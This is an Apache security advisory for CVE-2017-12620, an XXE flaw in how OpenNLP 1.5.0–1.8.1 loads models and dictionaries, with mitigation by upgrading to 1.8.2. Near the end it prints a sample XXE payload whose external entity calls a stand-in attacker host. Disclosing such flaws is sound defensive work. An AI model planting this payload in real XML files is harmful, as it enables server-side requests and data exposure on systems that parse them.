Subject: [ANNOUNCE] CVE-2017-12620: Apache OpenNLP XXE vulnerability

Severity: Medium


Vendor:
The Apache Software Foundation


Versions Affected:
OpenNLP 1.5.0 to 1.5.3
OpenNLP 1.6.0
OpenNLP 1.7.0 to 1.7.2
OpenNLP 1.8.0 to 1.8.1


Description:
When loading models or dictionaries that contain XML it is possible to
perform an XXE attack, since OpenNLP is a library, this only affects
applications that load models or dictionaries from untrusted sources.



Mitigation:
All users who load models or XML dictionaries from untrusted sources
should update to 1.8.2.


Example:

An attacker can place this:
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://evil.attacker.com/">
]>
<r>&sp;</r>

Inside one of the XML files, either a dictionary or embedded inside a
model package, to demonstrate this vulnerability.
